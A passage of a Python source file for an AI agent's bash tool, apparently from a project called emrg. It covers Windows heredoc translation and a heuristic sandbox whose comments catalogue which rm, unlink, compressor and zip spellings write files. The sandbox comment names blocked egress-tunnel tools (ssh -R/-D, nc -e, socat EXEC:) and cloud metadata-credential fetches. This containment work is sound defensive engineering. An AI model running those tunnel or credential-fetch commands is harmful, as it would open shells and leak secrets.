"""Bash tool — execute shell commands and return stdout/stderr."""

from __future__ import annotations

import asyncio
import locale
import logging
import os
import re
import shlex
import signal
import tempfile

from emrg._win import win32_no_window_kwargs
from emrg.server.git_utils import no_prompt_env
from emrg.server.tool_types import ToolDefinition, ToolResult
from emrg.tools.base import ToolExecutor

logger = logging.getLogger(__name__)


MAX_OUTPUT_CHARS = 200_000  # Truncate large outputs (framing supports up to 16MB)

# Heredoc start: `cmd <<'EOF'` / `cmd <<EOF` / `cmd <<-EOF` (quote optional,
# matched symmetrically via backreference). MULTILINE so ^/$ bound the first
# command line, not the whole command string. cmd.exe cannot parse this.
_HEREDOC_START_RE = re.compile(
    r"^(?P<head>.*?)(?P<op><<-?)(?P<quote>['\"]?)(?P<name>[A-Za-z_][A-Za-z0-9_.-]*)(?P=quote)\s*$",
    re.MULTILINE,
)


def _translate_windows_heredocs(cmd: str) -> tuple[str, str | None]:
    """Translate the first bash heredoc into a stdin redirect for cmd.exe.

    The bash tool's subprocess shell on Windows is cmd.exe (via COMSPEC),
    which cannot parse ``cmd <<'EOF' ... EOF`` heredocs — commands documented
    with heredoc syntax (e.g. ``browser-harness <<'PY' ... PY``) fail with
    ``<< is not recognized`` / ``此时不应有 <<``, forcing agents into temp-file
    workarounds. Rewriting the heredoc to ``cmd < tempfile`` feeds the same
    bytes via stdin redirect, so Windows agents run the identical commands as
    POSIX (host sessions 2026-08-14T21:26/21:36 observed the failure twice).

    Only the FIRST heredoc is translated (multiple heredocs in one command are
    rare); an unterminated heredoc is left untouched so cmd.exe reports the
    original error. ``<<-`` (tab-stripping) strips leading tabs from the body,
    mirroring bash. Content is written literally (quoted ``<<'EOF'``
    semantics; unquoted heredocs containing ``$`` expansion keep literal
    content — a documented approximation). Everything before the opener line
    (e.g. ``cd /tmp\n`` in a multi-line command) is preserved verbatim in the
    rewritten command, so the heredoc feeds the same stdin into the same
    command line as POSIX (review #797 ❌).

    Returns ``(rewritten_cmd, temp_path)`` — the caller must unlink temp_path
    after the subprocess finishes (normal or timeout path).
    """
    m = _HEREDOC_START_RE.search(cmd)
    if not m:
        return cmd, None
    head, op, name = m.group("head"), m.group("op"), m.group("name")
    strip_tabs = op.endswith("-")
    # Terminator: a line containing exactly the delimiter (optionally indented
    # with tabs when the opener used `<<-`, mirroring bash tab-stripping).
    term = re.compile(rf"(?m)^[ \t]*{re.escape(name)}\s*$" if strip_tabs
                      else rf"(?m)^{re.escape(name)}\s*$")
    tm = term.search(cmd, m.end())
    if not tm:
        return cmd, None  # unterminated — let cmd.exe report it
    body = cmd[m.end():tm.start()]
    if body.startswith("\r\n"):
        body = body[2:]  # opener-line newline is not part of the body
    elif body.startswith("\n"):
        body = body[1:]
    if strip_tabs:
        body = "\n".join(line.lstrip("\t") for line in body.split("\n"))
    # bash keeps the newline that precedes the terminator line as part of the
    # body (a heredoc always ends with exactly one newline) — keep it verbatim.
    tail = cmd[tm.end():].strip()
    fd, path = tempfile.mkstemp(suffix=".heredoc", text=True)
    try:
        # newline="" keeps LF verbatim (no CRLF conversion of the body)
        with os.fdopen(fd, "w", encoding="utf-8", newline="") as f:
            f.write(body)
    except Exception:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    # Keep everything before the opener line (multi-line commands such as
    # `cd /tmp\npython <<'PY'` must not lose their prefix — review #797 ❌).
    rewritten = f"{cmd[:m.start()]}{head}< \"{path}\""
    if tail:
        rewritten += f" {tail}"
    return rewritten.rstrip(), path


# ── Sandbox — file-level isolation for the bash tool (rant 2026-08-20T15:46:50) ──
#
# Three tiers (default danger-full-access = current, un-sandboxed behavior):
#   danger-full-access  — no checks at all (existing behavior)
#   read-only           — no writes allowed: destructive commands (rm -r /
#                         rmdir / unlink / mv / cp -r), git mutating commands (stash /
#                         checkout / restore / clean / reset / commit / push /
#                         pull / merge / rebase — community issue #979) and
#                         shell redirects (> / >>) to any non-/dev/null target
#                         are blocked
#   workspace-write     — writes are allowed only inside three roots: the
#                         workspace root, the OS temp root
#                         `tempfile.gettempdir()` ($TMPDIR on macOS —
#                         /var/folders/<…>/T, NOT /tmp there; /tmp on Linux),
#                         and the trusted data roots (`_trusted_write_zones`).
#                         Destructive writes to protected daemon state files
#                         and to every other absolute path are blocked.
#                         Measured 2026-09-16: `$TMPDIR/x` ALLOW while `/tmp/x`,
#                         `/private/tmp/x`, `/var/tmp/x`, `/dev/shm/x` BLOCK —
#                         "the OS temp area" is gettempdir(), not a guess at it
#   both checked tiers  — destination-based containment-escape guard
#                         (issue #1102, borrowed from Claude Code v2.1.257):
#                         cloud metadata-credential fetches (IMDS/ECS/GCP)
#                         and egress-tunnel markers (ssh -R/-D, nc -e,
#                         socat EXEC:/SYSTEM:, IMDSv2 token) are blocked;
#                         the danger tier only warns (command still runs)
#
# Enforcement is deliberately heuristic (host design-finalized): a static
# command scan, NOT an OS-level sandbox (no bwrap/Seatbelt/ACL). The checked
# modes report enforcement="partial" — honest reporting, never pretending
# full OS-level isolation. The core value is blocking a hallucinated LLM's
# obviously destructive commands (rm -rf with a wrong path, writing the
# daemon's own state files).

SANDBOX_MODES = ("danger-full-access", "read-only", "workspace-write")

# Daemon state files — writing to these from a sandboxed task is always
# blocked (they are the daemon's own data, not agent scratch space).
_PROTECTED_FILES = (
    "~/.emrg/config.toml",
    "~/.emrg/emrgd.token",
    "~/.emrg/tasks.yml",
    "~/.emrg/projects.yml",
    "~/.emrg/rants.jsonl",
)

# Shell operators that separate one command from the next in a chain. After
# tokenizing with punctuation_chars these arrive as their own tokens, which is
# what lets `_args_after_command` stop at the next command.
_COMMAND_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})

# Verbs whose *arguments are files they rewrite in place*. They were invisible
# to the old spelling-based scan (issue #1162): `sed -i`, `truncate`, `tee`.
# A read-only cycle exists to protect uncommitted work, and every one of these
# can destroy it just as completely as `rm -rf`.
_INPLACE_WRITER_VERBS = frozenset({"truncate", "tee", "shred"})

# Verbs whose *operands are removed* — the most destructive family here, and the
# one the walk reads first: every operand is a write target whether or not any
# flag is present, because `rm a.txt` destroys uncommitted work exactly like
# `rm -rf dir` (the recursion is not what decides whether the file survives).
#
# `unlink` is the member this set was missing (measured 2026-09-19,
# `cyc20260919-194810`). It is the POSIX way to remove *one* file, present on
# every platform this tool runs on (`/usr/bin/unlink`, macOS and Linux alike),
# and on master `910a307c` it was invisible to the walk in every spelling:
# `unlink <outside>/f`, `unlink -- <outside>/f`, `/usr/bin/unlink <outside>/f`
# and `unlink <protected daemon file>` each reported an **empty target list** at
# both tiers — and an empty list is allowed by construction, so the loop that
# judges targets never ran. `rm` and `rmdir` on the same two paths were refused
# in the same geometry, which is what makes this a hole rather than an opinion.
#
# Ground truth, taken in a scratch directory on this host and read back off disk
# (BSD `unlink`, 2026-09-19): `unlink f.txt` really deletes it (rc=0, gone);
# a missing operand reports an error and exits 0 without touching anything;
# `unlink -x` and `unlink --help` both deleted the files of those very names,
# i.e. this program takes no options at all beyond `--` — its usage line is
# `unlink [--] file`; and `unlink two1 two2` printed that usage line and deleted
# **neither** file, so its single-operand form is the only one that deletes.
#
# Every operand is still named here, the rule `rm` reads: the one spelling that
# over-names is `unlink a b`, which deletes nothing at all, so the over-block
# costs nothing real — while a rule that read only the first operand would be a
# second special case (the `_FIRST_OPERAND_CREATING_VERBS` shape) for no
# measured gain. A `-`-leading operand (`unlink -x`, which really does delete the
# file of that name) is dropped by `_positional_args` along with every other
# option-shaped token; that limit is the general one `rm -- -s` shares, and it is
# pinned as a limit rather than papered over in
# `tests/test_bash_tool_unlink_remover.py`.
_REMOVER_VERBS = frozenset({"rm", "rmdir", "unlink"})

# The compressors are that same family — `gzip f` replaces `f` with `f.gz` and
# removes `f`, exactly as completely as `truncate -s 0 f` empties it — with one
# difference that keeps them out of the set above: a flag can turn the very same
# operand into a pure read.
#
# Measured on master `9a8bc960` (2026-09-19), one geometry, two tiers, the same
# protected daemon file (`~/.emrg/rants.jsonl`, never opened — `_check_sandbox`
# only `realpath`s it): `gzip`, `gzip -f`, `gzip -9`, `gzip -k`, `gzip -d`,
# `gunzip`, `bzip2`, `xz` and `zstd` all answered ALLOW at **both** tiers, while
# `truncate -s 0`, `tee` and `shred -u` on that path were refused with "blocked
# write to protected daemon file" — and under `read-only`, whose whole job is to
# protect uncommitted work, `gzip` was the one that got through. An empty target
# list is allowed by construction (the loop that judges targets never runs), so
# this was a hole rather than an opinion, and nothing pinned it.
#
# The `*cat` forms (`zcat`, `bzcat`, `xzcat`, `zstdcat`) are deliberately
# **absent**: they are `-dc` wrappers that write nothing, so naming their operand
# a write would refuse `zcat <file>` — the false block this walk treats as worse
# than the hole.
# `compress` reads the same way, and was the name this list still missed
# (measured 2026-09-19, cyc20260919-162257): `/usr/bin/compress` is installed on
# this host, and `compress f` **removes `f` and writes `f.Z`** — measured in a
# scratch directory, `f` gone and `f.Z` present at rc=0, with `uncompress f.Z`
# doing the same in reverse. Both answered ALLOW on the protected daemon file at
# **both** tiers while `gzip` was refused, i.e. the same hole #1418 closed for the
# rest of the family, one installable name over. They are the same shape, so they
# belong in the same set rather than in a branch of their own.
#
# `zstdmt` is the same binary as `zstd` under a second name, and this list is a
# list of *names*, so the twin kept the hole one argv[0] over (measured
# 2026-09-19, on this host). `/opt/homebrew/bin/zstdmt` is a **symlink** to
# `/opt/homebrew/Cellar/zstd/1.5.7/bin/zstd`; both files hash to
# `15da463937cca60558fc7e7b281e09b071ea40ea3b80408328a87d4f83195be1`, and their
# `--help` output differs in exactly one line — the usage line's program name
# (`Usage: zstdmt [OPTIONS...] [INPUT... | -] [-o OUTPUT]` against the same line
# with `zstd`). So the program dispatches on argv[0] and nothing else, and every
# row measured for `zstd` holds verbatim: in a scratch directory holding only `f`,
# `zstdmt f` and `zstdmt -19 f` both derive `f.zst` beside it at rc=0 (stderr
# `f :172.22% (18 B => 31 B, f.zst)`), while `zstdmt -c f` and `zstdmt --stdout f`
# leave the directory with `f` alone, `zstdmt -l f.zst` prints the frame table and
# `zstdmt -t f.zst` tests it, neither creating a file. Those are this family's own
# read letters and longs taken unchanged. It joins on same-bytes evidence, not on
# the name's resemblance — the distinction `*cat` below is the other half of.
# `pigz`/`unpigz` are the parallel twin of `gzip`/`gunzip`, and their *shape* is
# this family's rather than a second one — measured 2026-09-20 on the binary built
# from pigz's own release source (`madler/pigz` v2.8, `make` in a scratch dir; no
# package of it is installed on this host), one **fresh** directory per row with
# only the input present and the listing read back off disk afterwards:
#
#   pigz f            writes  f.gz          the operand is rewritten, `f` gone
#   pigz -9 f         writes  f.gz
#   pigz -k f         writes  f  f.gz       the keep spelling, a second file
#   pigz -S .zz f     writes  f.zz          the family's one spaced value
#   pigz -d f.gz      writes  f             the decompressing form writes too
#   unpigz f.gz       writes  f
#   pigz - f          writes  f.gz          the file beside the stream stays one
#   pigz f -          writes  f.gz          …in either position
#   pigz -c f         read    f             [stdout]
#   pigz --stdout f   read    f             [stdout]
#   pigz -t f.gz      read    f.gz          [test]
#   pigz --test f.gz  read    f.gz          [test]
#   pigz -l f.gz      read    f.gz          [list]
#   pigz --list f.gz  read    f.gz          [list]
#   pigz -dc f.gz     read    f.gz          [the zcat idiom]
#   unpigz -c f.gz    read    f.gz
#   unpigz -t f.gz    read    f.gz
#   pigz -            read    nothing       [stdin to stdout]
#
# So it joins as a **name**: the operand is rewritten in place (unlike `lz4`, which
# derives a sibling), the three read letters are its own three unchanged, and the
# stream operand is the family's. Two limits travel with it and both are stated
# where they are read rather than fixed here: its five extra spaced values, against
# `_COMPRESSOR_OPTIONS_WITH_VALUE` below, and `pigz -h`/`--version`, which print and
# write nothing (measured, rc=0, one fresh directory per row) while the walk still
# names the operand after them — `gzip -h`, `gzip --help`, `bzip2 -h`, `xz -h` and
# `zstd -h` are the same shape here, so that one is the family's limit, not this
# verb's, and it is named rather than fixed for that reason.
_COMPRESSOR_VERBS = frozenset({
    "gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz", "lzma", "unlzma",
    "zstd", "unzstd", "compress", "uncompress", "zstdmt",
    "pigz", "unpigz",
})

# `-S`/`--suffix` is the one option in this family that takes a spaced value, and
# naming the suffix a path is the mistake `_positional_args` exists to avoid.
# **That sentence has one exception, carried rather than fixed**: `pigz` takes five
# more spaced values — `-b`, `-p`, `-A`, `-I`, `-J`, the same five its own source
# names as taking an option parameter (`pigz.c`: "process option parameter for
# -b, -p, -A, -S, -I, or -J"). Measured 2026-09-20 on the binary above, one fresh
# directory per row: `pigz -b 65536 f`, `pigz -p 2 f`, `pigz -A nm f`, `pigz -I 5 f`
# and `pigz -J 4 f` each write `f.gz`, so the value is really a value and the walk
# reads it as an operand as well — an **over-naming, never a missing name**, since
# the operand itself is still named and still refused. The one spelling where that
# value could be a path, `pigz -p /outside/x f`, is rc=22 with nothing written. The
# read gate refuses a per-compressor value table deliberately (its docstring says
# so); this is that same limit one verb further, stated instead of grown.
_COMPRESSOR_OPTIONS_WITH_VALUE = frozenset({"-S", "--suffix"})

# The spellings under which that operand is a *read*: the bytes go to stdout
# instead of back into a file (`-c`, `--stdout`, `--to-stdout`), or the file is
# only tested or listed (`-t`, `-l`, and their long forms). Every program above
# takes all three letters **except `compress`**, whose own usage line is
# `compress [-cfv] [-b bits] [file ...]`: measured 2026-09-19, `compress -t` and
# `compress -l` are both rejected as illegal options, so the program writes
# nothing under them and reading those letters as reads cannot hide a write —
# the letter this family needs from it is `-c`, which it does take. A letter
# counts **inside a short cluster** as well as
# alone, because `gzip -dc <f>` is the `zcat` idiom a reader actually types, and a
# rule that knew only the spaced `-c` would refuse a pure read. The long forms are
# matched exactly rather than by prefix: `--list` is a read, `--license` is not.
_COMPRESSOR_READ_LETTERS = frozenset({"c", "t", "l"})
_COMPRESSOR_READ_LONG = frozenset({
    "--stdout", "--to-stdout", "--test", "--list",
})

# `lz4` is a compressor whose *default* form is not the in-place rewrite the
# family above is, and the difference is measured rather than read off the
# family's name.
#
# Measured with the host's own binary (`lz4 v1.10.0`, `/opt/homebrew/bin/lz4`,
# 2026-09-19): one **fresh** directory per row, only the input present, the
# listing read back off disk afterwards —
#
#   lz4 f              writes  f  f.lz4            a sibling is derived; `f` stays
#   lz4 -f f           writes  f  f.lz4
#   lz4 -z f           writes  f  f.lz4
#   lz4 -l f           writes  f  f.lz4            `-l` is **legacy format**
#   lz4 -m f g         writes  f  f.lz4  g  g.lz4  every operand derives one
#   lz4 -r f           writes  f  f.lz4            (`-r` implies `-m`)
#   lz4 f out.lz4      writes  f  out.lz4          the last operand is the output
#   lz4 --rm f         writes  f.lz4               and removes the operand
#   lz4 -d f.lz4       writes  f  f.lz4            the decompressing form writes too
#   lz4 -c f           read    f                   [stdout]
#   lz4 --stdout f     read    f                   [stdout]
#   lz4 -t f.lz4       read    f.lz4               [test]
#   lz4 --test f.lz4   read    f.lz4               [test]
#   lz4 -b f           read    f                   [benchmark, prints to stdout]
#   lz4 --list f.lz4   read    f.lz4               [frame info]
#
# Three consequences, and each is why this verb is read in its own branch rather
# than added to `_COMPRESSOR_VERBS`:
#
# 1. The operand is **not rewritten** — a path beside it is created. Naming the
#    operand is still sound, because a derived sibling lands in the operand's own
#    directory and in no other, so the operand names the directory the write
#    happens in; but it is a different claim from `gzip`'s and has to be stated.
# 2. `-l` is legacy format here, a **write**. Read with `_COMPRESSOR_READ_LETTERS`
#    this verb would leave `lz4 -l f` unnamed while it really writes `f.lz4` —
#    a miss, and the reason the family's letters cannot be lent to a verb that
#    spells one of them differently.
# 3. Under `-m`/`-r` *every* operand is an input (`lz4 -m f g` derives two
#    siblings), so the last-operand rule would name one file and let the other
#    past. Both spellings are measured above.
#
# `unlz4`, `lz4c` and `lz4cat` are the *same file* as `lz4` under three other
# argv[0] spellings — measured 2026-09-19 on this host, where
# `/opt/homebrew/Cellar/lz4/1.10.0/bin/lz4` has three symlinks beside it and all
# four names hash to
# `b08405ac45dc1be5615bca7681c8d8d802a62ee9d5e1c1b4392a1e2cc7f68169`. Two of them
# write in this verb's own shape and one does not, so only the writing pair joins:
#   `unlz4 f.lz4`   writes `f` beside the operand (stderr `Decoding file f`) — the
#                   decompressing twin, the same row as `lz4 -d f.lz4` above;
#   `lz4c f`        writes `f.lz4` (stderr `Compressed filename will be : f.lz4`) —
#                   the legacy CLI name, whose default form is this verb's;
#   `lz4cat f.lz4`  writes nothing, the bytes go to stdout — `lz4 -dc` under a
#                   name, and the member of this group that must **not** join.
# The two that join inherit the read gate unchanged (`unlz4 -c f.lz4` and
# `unlz4 -t f.lz4` both leave the directory as they found it), because it is the
# same parser; naming their operand is sound for the reason given above.
_LZ4_VERBS = frozenset({"lz4", "unlz4", "lz4c"})
_LZ4_READ_LETTERS = frozenset({"c", "t", "b"})
_LZ4_READ_LONG = frozenset({"--stdout", "--test", "--list"})
# `-m`/`-r` turn every operand into an input; without them the last operand is
# the explicit destination and the only operand written.
_LZ4_MULTI_LETTERS = frozenset({"m", "r"})
_LZ4_MULTI_LONG = frozenset({"--multiple", "--recursive"})
# `-D <file>` is the one spaced value here: it is the dictionary, a *read*, and
# naming it would refuse `lz4 -D <outside>/dict f`, whose write is elsewhere.
_LZ4_OPTIONS_WITH_VALUE = frozenset({"-D"})
# …and the same option spelled **attached** (`-Ddata.txt`), where everything after
# the `D` *inside the token* is that option's value and not another flag. Derived
# from the table above rather than written out a second time, so the two readings
# cannot drift: the binary writes both spellings beside the operand (measured,
# issue #1426) and reading the value's letters as flags named nothing at all.
_LZ4_VALUE_TAKING_SHORT = frozenset(
    opt[1:]
    for opt in _LZ4_OPTIONS_WITH_VALUE
    if opt.startswith("-") and not opt.startswith("--")
)

# `pzstd` is zstd's parallel front-end — a **different binary**, not a second name,
# which is the reading `zstdmt` above turns on and this verb is the other side of.
# Measured on this host (2026-09-19): `/opt/homebrew/bin/pzstd` realpaths into the
# same Cellar as `zstd` but hashes
# `0bad6c010cc29143f7c84808393943bf30b4ad5a11368d3c353e330d09e246f6` against
# zstd's `15da463937cca60558fc7e7b281e09b071ea40ea3b80408328a87d4f83195be1`, and
# its own usage line (`pzstd [args] [FILE(s)]`, `-o  file : result stored into
# \`file\` (only if 1 input file)`) is the program's, not zstd's. One **fresh**
# directory per row with `f` present and the listing read back off disk:
#
#   pzstd f                    writes  f  f.zst          a sibling is derived; `f` STAYS
#   pzstd -k f                 writes  f  f.zst
#   pzstd -19 f / -vv f / -q f writes  f  f.zst
#   pzstd --rm f               writes  f.zst             and removes the operand
#   pzstd -p 4 f               writes  f  f.zst          `-p` eats `4`; sibling still derived
#   pzstd f g                  writes  f.zst  g.zst      every operand derives one
#   pzstd -o out.zst f         writes  f  out.zst        `-o` is a real destination
#   pzstd -oout.zst f          writes  f  out.zst        …and takes an attached value
#   pzstd f -o out.zst         writes  f  out.zst        the destination wins wherever it stands
#   pzstd -o out.zst -         writes  out.zst           the stream still gets a destination
#   pzstd -qo out.zst f        writes  f  out.zst        the destination letter inside a cluster
#   pzstd -qoout.zst f         writes  f  out.zst        …attached, in the same cluster
#   pzstd -co out.zst f        writes  f  out.zst        a read letter in FRONT of it, and it still
#                                                        writes the file: 0 bytes on stdout
#   pzstd -qo out.zst          writes  out.zst           no operand — stdin is the input
#   pzstd -qo - f              read    f                 [stdout] — a cluster's `-` destination
#   pzstd -c f / --stdout f    read    f                 [stdout]
#   pzstd -t f.zst             read    f.zst             [test]
#   pzstd -dc f.zst            read    f.zst             [decompress to stdout]
#   pzstd -                    read    —                 the stream; nothing on disk
#   pzstd -o - f               read    f                 [stdout] — `-` as the destination
#   pzstd - f                  rc=1    f                 "Cannot specify standard input when
#                                                        handling multiple files" — writes nothing
#   pzstd -l f / --list f      rc=1    f                 `Invalid argument: -l` — not an option
#   pzstd --to-stdout f        rc=1    f                 `Invalid argument` — not an option
#   pzstd --output=out.zst f   rc=1    f                 `Invalid argument` — the long form does
#                                                        **not** exist here (see the table below)
#   pzstd -o out.zst f g       rc=1    f  f.zst          "Cannot specify an output file when
#                                                        handling multiple inputs"
#
# Five consequences, and each is why this verb gets a branch of its own rather
# than joining `_COMPRESSOR_VERBS`:
#
# 1. The default form **keeps** the operand and derives a sibling (`f` → `f.zst`),
#    which is `lz4`'s shape and not the in-place family's. Naming the operand is
#    still sound — the sibling lands in the operand's own directory and in no
#    other — but it is a different claim from `gzip`'s and has to be stated.
# 2. `-o` names the write in **option position**, where no operand rule reaches
#    it; and while `-o` is present the operands are *read* (`pzstd -o out.zst f`
#    leaves `f` untouched), so naming them as well would refuse a pure read.
# 3. The attached spelling `-oout.zst` carries the letter `t`, so the family's
#    read gate would read it as `--test` and answer "read, nothing named" — the
#    hole this branch closes, reopened one spelling over. The letter scan in
#    `_pzstd_read_form` stops at `o` for the reason `_lz4_letters` stops at `D`.
# 4. The destination question has to come **before** that read gate, because here
#    they are not alternatives: `pzstd -co out.zst f` is rc=0 with 0 bytes on stdout
#    and `out.zst` written (measured 2026-09-20). A gate that answered "read" from
#    the first read letter would leave that write unnamed. The ordering is this
#    verb's, measured; `zip`'s is the opposite and measured there (#1445 keeps its
#    read gate first, because `zip -sf … --out …` really does write nothing).
# 5. The destination letter may sit **inside a cluster** (`-qo out.zst`), which is
#    why this verb passes its own value-taking letters to
#    `_option_destination_values` — measured: `pzstd -qo out.zst f` writes `out.zst`
#    and keeps `f`, and `pzstd -qoout.zst f` is the same in one token.
#
# `-l`/`--list` is in the read letters although pzstd **rejects** it, for the same
# reason `compress`'s illegal `-t` is in the family's set: the program writes
# nothing under it, so reading the letter as a read cannot hide a write, while
# *not* reading it would refuse a run that was going to fail anyway.
_PZSTD_VERBS = frozenset({"pzstd"})
_PZSTD_READ_LETTERS = frozenset({"c", "t", "l"})
_PZSTD_READ_LONG = frozenset({"--stdout", "--test", "--list"})
# `-o file` is the destination and `-p #` / `--processes #` a thread count: both
# take a spaced value, and naming that value would point the guard at a token that
# is not a path (`pzstd -p 4 f` writes `f.zst`, not `4`).
_PZSTD_OPTIONS_WITH_VALUE = frozenset({"-o", "-p", "--processes"})
# The destination is `-o` alone: `--output` and `--output=` are measured **not to
# exist** here (`Invalid argument`), unlike every other verb that reads its
# destination from an option. It is left out rather than read defensively, because
# the usual justification for reading an unmeasured spelling — "refusing a command
# that was going to fail anyway costs less than missing a write" — does not apply
# to a spelling the program itself rejects: there is no write to miss.
_PZSTD_DESTINATION_OPTIONS = frozenset({"-o"})
# …and the letters that decide where a **cluster's** value is: both readings are
# taken from this verb's own value-taking table (`-o`, `-p`), derived rather than
# written out so a letter added above cannot be read in the spaced spelling and
# silently not in the clustered one. Two callers ask it the same question — the
# destination extractor, which names the value only when the letter that carried it
# is `o`, and `_pzstd_names_a_destination`, which asks whether `o` was spelled at
# all — and the operand walk derives the same set from `_PZSTD_OPTIONS_WITH_VALUE`,
# so all three agree about which token carries a value (`pzstd -qo out.zst f`).
_PZSTD_VALUE_TAKING_SHORT = frozenset(
    opt[1:]
    for opt in _PZSTD_OPTIONS_WITH_VALUE
    if opt.startswith("-") and not opt.startswith("--")
)

# `zip` writes the archive, and the archive is the **first** operand — the
# opposite end of the operand list from `cp`/`mv`/`rsync`, whose destination is
# the last one. Every operand rule the walk already has reads the last operand or
# every operand, so none of them reaches it and the archive was named by nothing.
#
# Measured on the host's own binary (`/usr/bin/zip`, Info-ZIP 3.0, 2026-09-19):
# one fresh directory per row holding `f` and `g`, `a.zip` pre-built where the row
# needs one, and the result read back off disk as `st_mtime_ns` plus a content
# hash (the hash alone cannot see an in-place rewrite of identical bytes, which is
# exactly what `zip a.zip f` does when `f` is unchanged) —
#
#   zip a.zip f                a.zip CREATED              (no archive yet)
#   zip a.zip f                a.zip REWRITTEN            (archive exists)
#   zip -q -r a.zip .          a.zip CREATED
#   zip -m a.zip f g           a.zip CREATED, f AND g GONE
#   zip --move a.zip f         a.zip CREATED, f GONE
#   zip -d a.zip f             a.zip REWRITTEN            (entry deleted)
#   zip -u a.zip g             a.zip REWRITTEN
#   zip -o a.zip f             a.zip REWRITTEN
#   zip -T a.zip f             a.zip REWRITTEN            mtime moved
#   zip -T a.zip               read    "test of a.zip OK" mtime untouched
#   zip -sf a.zip [f]          read    "Would Add/Update:" mtime untouched
#   zip --show-files a.zip f   read    same line           mtime untouched
#   zip -su a.zip / -sU a.zip  read    rc=16, nothing written
#   zip -h a.zip f             read    help, nothing written
#   zip -h2 a.zip f            read    extended help, nothing written
#   zip -L a.zip f             read    licence, nothing written
#   zip --help a.zip f         read    help, nothing written
#   zip --version a.zip f      read    help, nothing written
#   zip a.zip                  nothing rc=12 "Nothing to do!"
#   zip -d a.zip               nothing rc=12
#   zip -v a.zip               nothing rc=12
#   zip -l a.zip f             a.zip CREATED            lowercase `-l` is LF->CRLF
#   zip -v a.zip f             a.zip REWRITTEN          uppercase `-v` is verbose
#   zip -m a.zip f -x f        nothing rc=12             the exclusion won
#
# Four consequences, all measured rather than read off the usage line:
#
# 1. A run with **no list** writes nothing, whatever the mode: `zip a.zip`,
#    `zip -d a.zip` and `zip -v a.zip` each exit 12 with "Nothing to do!". So the
#    archive is named only when a second operand follows it, and `-T` needs no
#    rule of its own — `zip -T a.zip` is the *test* form and its one-operand shape
#    is already the "nothing written" case.
# 2. `-T` is therefore **not** a read. With a list it rewrites the archive
#    (`zip -T a.zip f`, mtime moved), which is the lz4 `-l` lesson again: a
#    spelling that is a read in one shape and a write in another cannot be read
#    as a flag.
# 3. `-m`/`--move` **deletes** every listed file once it is archived, so under it
#    the operands after the archive are write targets too, not inputs.
# 4. The read spellings are matched as **whole tokens, case-sensitively**: `-sf`
#    is show-files while `-f` is freshen (a write), `-L` is the licence while `-l`
#    is the LF->CRLF conversion (a write, measured above). A letter scan — the
#    shape the compressor family uses — would conflate both pairs.
#
# 5. `-P <password>` is the family's **sixth** spaced value, and it was the one
#    this table was short. Measured on the same binary 2026-09-20, one fresh
#    directory per row holding `f`:
#
#      zip -P secret a.zip f     rc=0, **a.zip created** — the archive is still the
#                                first operand, the password is an option's value
#      zip -P a.zip f            rc=12 nothing written (`a.zip` was eaten as the
#                                password, so `f` is the archive with no list)
#      zip -Psecret a.zip f      rc=0, a.zip created — the **attached** spelling
#      zip -P secret a.zip       rc=12 nothing written
#
#    The attached spelling never needed the table (the token begins with `-`, so
#    `_positional_args` drops it either way), which is exactly why the spaced one
#    went unnoticed: with `-P` absent from the table the walk named the
#    **password** as the archive. That is the wrong name `_positional_args`'
#    docstring calls a guard nobody can trust *and* it is a hole in the direction
#    this rule exists for — measured through the predicate on the branch this
#    table was written on: `zip -P ./pw <outside>/a.zip f` named `./pw` and was
#    **allowed at `workspace-write`** while really rewriting the archive outside
#    every allowed root, because the wrong token resolved inside the workspace.
#
# 6. Three more spaced values were still missing from the table after that fix —
#    `-tt <date>`, `-Z <cm>` and `-lf <path>` — each measured the same way
#    (2026-09-20, one fresh directory per row holding `f`):
#
#      zip -tt 20200101 a.zip f  rc=12, "invalid date entered for -tt option —
#                                use mmddyyyy or yyyy-mm-dd": the option **ate**
#                                the token, so with a valid date the archive is
#                                whatever follows it
#      zip -Z store a.zip f      rc=0, a.zip created, and **no file named
#                                `store`** — the method name is consumed
#      zip -lf ./log a.zip f     rc=0, a.zip created, `log.log` created
#      zip -lf./log2 a.zip f     rc=0, `log2.log` created — the attached spelling
#
#    The first two are values that are never paths, so the table is all they
#    need. `-lf` is different: its value **is** a path zip writes, so the table
#    alone would stop naming it. Three properties decide how it is named, all
#    measured on the same binary:
#
#      zip -sf -lf ./log a.zip   rc=0, the listing printed and `log.log` CREATED —
#                                a read spelling still writes the logfile, so it
#                                has to survive the read short-circuit
#      zip -lf ./log a.zip       "zip error: Nothing to do!" and `log.log` still
#                                CREATED — so it survives the writes-nothing case
#      zip -lf ./log3 a.zip f    `log3.log` written: zip appends `.log` when the
#                                value does not already end in it, which lands in
#                                the same directory, so naming the token as
#                                written is containment-equivalent
_ZIP_OPTIONS_WITH_VALUE = frozenset({
    "-b", "-t", "-tt", "-n", "-s", "-TT", "-P", "-Z", "-lf",
})
_ZIP_READ_TOKENS = frozenset({
    "-sf", "-su", "-sU", "-h", "-h2", "-L", "--help", "--version",
    "--show-files",
})
_ZIP_MOVE_FLAGS = frozenset({"-m", "--move"})

# `--out <archive>` (short `-O`) is the destination Copy Mode writes *instead of*
# updating the input archive in place, so its value is a **path** — the one departure
# from the table above, whose every other value is not a path. It is read by its own
# rule (`_zip_out_values`) rather than by that table, which is why it is not in it.
# Measured on the host's binary (Info-ZIP 3.0, Apple build), 2026-09-20, one fresh
# directory per row holding a pre-built `src.zip` with one member, the result read
# back off disk (existence, `st_mtime_ns`, member list):
#
#   zip -U src.zip --out o.zip        rc=0, `o.zip` created, `src.zip` untouched
#   zip src.zip --out o.zip           rc=0, the same — `--out` implies copy mode on
#                                     its own, so `-U` is not part of the rule
#   zip -U src.zip --out=o.zip        rc=0, `o.zip` created (attached long spelling)
#   zip -U src.zip -O o.zip           rc=0, `o.zip` created (short, spaced)
#   zip -U src.zip -Oo.zip            rc=0, `o.zip` created (short, attached)
#   zip src.zip -UO o.zip             rc=0, `o.zip` created (cluster, spaced) — #1441
#   zip src.zip -UOo.zip              rc=0, `o.zip` created (cluster, attached) — #1441
#   zip -UO o.zip src.zip             rc=0, `o.zip` created (cluster leads) — #1441
#   zip -U --out o.zip src.zip        rc=0, `o.zip` created (option before operand)
#   zip -U src.zip --out o.zip -lf log  rc=0, `o.zip` AND `log.log` created
#   zip -sf -U src.zip --out o.zip    rc=0, the listing printed and **nothing
#                                     written** — the read gate beats copy mode
#
# and the two facts that decide the rest of the rule:
#
#   zip -d base.zip one.txt --out o.zip  rc=0 with `base.zip` **byte-identical**
#                                     afterwards and its member list unchanged:
